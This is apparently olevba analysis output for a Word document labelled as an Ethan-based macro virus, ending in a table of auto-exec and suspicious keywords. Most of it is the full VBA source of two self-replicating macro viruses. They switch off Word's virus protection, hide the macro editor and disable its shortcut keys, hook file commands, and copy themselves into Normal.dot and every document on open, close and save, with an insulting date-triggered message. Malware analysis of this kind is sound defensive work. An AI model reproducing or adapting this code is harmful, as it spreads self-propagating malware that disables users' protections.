olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-a95efab28a9c1cd8ec89c976115295df61746e39
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan-based-a95efab28a9c1cd8ec89c976115295df61746e39 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\ethan.___", 6) = "" Then
Open "c:\ethan.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
Sub AutoClose()
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
On Error GoTo out
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
Options.VirusProtection = False
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
Options.SaveNormalPrompt = False
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
Options.ConfirmConversions = False
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
If nt > 70 And ad > 0 Then GoTo out
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
If nt < 70 Then
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
End If
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
host.CodeModule.AddFromFile ("c:\class.sys")
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
With host.CodeModule
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    For x = 1 To 4
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    .deletelines 1
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    Next x
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
End With
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
If nt < 70 Then
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    With host.CodeModule
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    .replaceline 1, "Sub AutoClose()"
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    .replaceline 91, "Sub ToolsMacro()"
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    For x = 70 To 81
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
        .deletelines 62
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    Next x
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    .replaceline 35, "    For x = 1 To 4"
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    End With
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
End If
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
With host.CodeModule
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    For x = 2 To 104 Step 2
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
    Next x
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
End With
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
out:
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
End Sub
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
Sub ToolsMacro()
'ws16/5/99 3:18:48 PMHP DeskJet 690C Series v11.0 on LPT3:a kiss for you honey
End Sub
-------------------------------------------------------------------------------
VBA MACRO CyberHack.bas 
in file: Virus.MSWord.Ethan-based-a95efab28a9c1cd8ec89c976115295df61746e39 - OLE stream: 'Macros/VBA/CyberHack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Macros By WinK'S Hacker
' Picture By Casper Satan

' Lebih baik mencoba dari pada tidak tahu sama sekali ...
' Mohon ma'af bila telah mengganggu Anda.
' Microsoft memang gila ! Nambahin fasilitas pemrogramannya
' keterlaluan untuk suatu word prosesor.
Public AlAsal
Public DokSave
Public Norok
Public Dokok
Sub CyInit()
    AlAsal = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Tahan
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub CyClose()
Application.DisplayAlerts = AlAsal
End Sub
Sub Dok2Nor()
    Call Tahan
    On Error GoTo Erw1
    Norok = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To nt.VBProject.VBComponents.Count
      NMacr = nt.VBProject.VBComponents(i).Name
      If NMacr = "CyberHack" Then Norok = True
      If (NMacr <> "CyberHack") And (NMacr <> "CyberForm") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=nt.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh1a:
    If Norok = False Then
      On Error GoTo Erh1
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "CyberHack", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "CyberForm", Object:=wdOrganizerObjectProjectItems
      Templates(nt.FullName).Save
Erh1:
    End If
Erw1:
End Sub
Sub Nor2Dok()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To ad.VBProject.VBComponents.Count
      NMacr = ad.VBProject.VBComponents(i).Name
      If NMacr = "CyberHack" Then Dokok = True
      NMacr = nt.VBProject.VBComponents(i).Name
      If NMacr = "CyberHack" Then Dokok = True
      If (NMacr <> "CyberHack") And (NMacr <> "CyberForm") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=ad.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "CyberHack", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "CyberForm", Object:=wdOrganizerObjectProjectItems
      DokSave = 1
Erh2:
    End If
Erw2:
End Sub
Sub Cyber()
    Call CyInit
    Call Dok2Nor
    Call CyClose
End Sub
Sub Tahan()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Simpan()
    On Error GoTo Erh4
Set ad = ActiveDocument
    If DokSave = 1 Then
       ad.SaveAs FileName:=ad.Name, FileFormat:=wdFormatDocument
    End If
Erh4:
End Sub
Sub AutoOpen()
    Call Cyber
End Sub
Sub FileClose()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    WordBasic.FileClose
End Sub
Sub FileOpen()
    Call Cyber
    
    Dialogs(wdDialogFileOpen).Show
    Call CyInit
    Call Nor2Dok
    Call Simpan
    Call CyClose
End Sub
Sub FileSaveAs()
   
   
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    
    
    
    
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Errh1:
End Sub
Sub HelpAbout()
    On Error GoTo Erw3
    CyberForm.Show
Erw3:
End Sub
Sub FileExit()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    On Error GoTo Erw4
    If WeekDay(Date) = 6 Then CyberForm.Show
Erw4:
    Call CyClose
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Cyber
End Sub
Sub FileNew()
    Call Cyber
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call Cyber
End Sub
Sub ToolsMacro()
    Call Cyber
End Sub
Sub ToolsCustomize()
    Call Cyber
End Sub
Sub ToolsCustomizeKeyboard()
    Call Cyber
End Sub
Sub ViewVBCode()
    Call Cyber
End Sub
Sub Organizer()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

